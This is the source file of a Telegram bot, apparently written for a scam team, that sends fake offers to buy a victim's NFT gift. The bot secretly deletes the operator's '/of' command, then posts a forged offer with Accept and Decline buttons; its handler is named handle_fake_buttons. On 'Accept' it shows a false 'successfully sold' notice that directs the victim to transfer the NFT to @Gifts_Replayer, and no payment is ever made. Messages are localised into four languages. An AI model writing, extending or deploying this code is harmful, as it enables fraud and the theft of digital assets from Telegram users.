import asyncio
import os
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.exceptions import TelegramBadRequest

print("--- 1. ИМПОРТЫ ПРОШЛИ УСПЕШНО ---")

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("!!! КРИТИЧЕСКАЯ ОШИБКА: BOT_TOKEN НЕ НАЙДЕН В СЕКРЕТАХ GITHUB !!!")
    exit(1) # Принудительно выключаем скрипт, если токена нет

print("--- 2. ТОКЕН НАЙДЕН, ИНИЦИАЛИЗАЦИЯ БОТА ---")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

TARGET_CHAT_ID = -1003747516067
INVITE_LINK = "https://t.me/+Q7j5G8Y24_U5OWY6"
active_users = set()

MESSAGES = {
    "ru": {
        "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд.",
        "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "btn_transfer": "Передать NFT"
    },
    "en": {
        "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> to receive stars.",
        "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
        "btn_accept": "Accept",
        "btn_decline": "Decline",
        "btn_transfer": "Transfer NFT"
    },
    "ua": {
        "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зарахування зірок.",
        "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
        "btn_accept": "Прийняти",
        "btn_decline": "Відхилити",
        "btn_transfer": "Передати NFT"
    },
    "ar": {
        "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> لاستلام النجوم.",
        "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
        "btn_accept": "قبول",
        "btn_decline": "رفض",
        "btn_transfer": "نقل NFT"
    }
}

def get_pretty_name(slug):
    raw_name = slug.split('-')[0]
    return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)

async def is_subscribed(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(f"Ошибка проверки подписки: {e}")
        return True 

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    if not await is_subscribed(message.from_user.id):
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)]])
        await message.answer("⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>", reply_markup=keyboard, parse_mode="HTML")
        return
    text = "<b>Как начать:</b>\nОтправь /ofteam\n\n<b>Формат оффера:</b>\n<code>/of ССЫЛКА ЦЕНА ВАЛЮТА ЯЗЫК</code>"
    await message.answer(text, parse_mode="HTML")

@dp.message(Command("ofteam"))
async def cmd_ofteam(message: types.Message):
    if await is_subscribed(message.from_user.id):
        user_id = message.from_user.id
        if user_id in active_users:
            await message.answer("✅ Доступ уже активен. Можно отправлять оферы.")
        else:
            active_users.add(user_id)
            await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")

@dp.message(F.text.startswith("/of"))
async def block_offer_in_pm(message: types.Message):
    await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")

@dp.business_message(F.text.startswith("/of"))
async def handle_offer_command(message: types.Message):
    print(f"ПОЛУЧЕНА КОМАНДА: {message.text}")
    business_connection_id = message.business_connection_id
    if not business_connection_id:
        return

    parts = message.text.split()
    if len(parts) < 4:
        return

    link = parts[1]
    if not link.startswith("http"):
        link = "https://" + link
    try:
        amount = int(parts[2])
    except ValueError:
        return
    
    currency = parts[3].lower()
    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
    lang = parts[4].lower() if len(parts) > 4 else "ru"
    if lang not in MESSAGES: lang = "ru"

    match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
    if not match: return
    
    gift_slug = match.group(1)
    pretty_name = get_pretty_name(gift_slug)
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    msg_data = MESSAGES[lang]

    caption_text = msg_data["offer"].format(username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)

    try:
        await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
        ]])
        await bot.send_message(chat_id=message.chat.id, text=caption_text, reply_markup=keyboard, business_connection_id=business_connection_id, parse_mode="HTML", link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True))
        print("--- ОФФЕР УСПЕШНО ОТПРАВЛЕН ---")
    except Exception as e:
        print(f"ОШИБКА ОТПРАВКИ: {e}")
        try:
            await bot.send_message(chat_id=message.from_user.id, text=f"⚠️ Ошибка:\n<code>{e}</code>", parse_mode="HTML")
        except: pass

@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
async def handle_fake_buttons(callback: types.CallbackQuery):
    if not callback.message: return
    data_parts = callback.data.split(":")
    action = data_parts[0]
    gift_slug = data_parts[1]
    amount = data_parts[2]
    currency = data_parts[3]
    lang = data_parts[4]
    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
    link = f"https://t.me/nft/{gift_slug}"
    pretty_name = get_pretty_name(gift_slug)
    business_connection_id = callback.message.business_connection_id
    msg_data = MESSAGES.get(lang, MESSAGES["ru"])

    try:
        if business_connection_id:
            await bot.delete_business_messages(business_connection_id, [callback.message.message_id])
        else:
            await callback.message.delete()

        if action == "accept":
            new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
            new_keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]])
        else:
            new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
            new_keyboard = None

        kwargs = {"chat_id": callback.message.chat.id, "text": new_text, "reply_markup": new_keyboard, "parse_mode": "HTML", "link_preview_options": LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)}
        if business_connection_id: kwargs["business_connection_id"] = business_connection_id
        await bot.send_message(**kwargs)
        await callback.answer()
    except Exception as e:
        print(f"Ошибка обработки кнопки: {e}")
        await callback.answer("Ошибка", show_alert=True)

async def main():
    print("--- 3. ЗАПУСК POLLING ---")
    await dp.start_polling(bot)

if __name__ == "__main__":
    print("--- 4. ВЫЗОВ ФУНКЦИИ MAIN ---")
    asyncio.run(main())
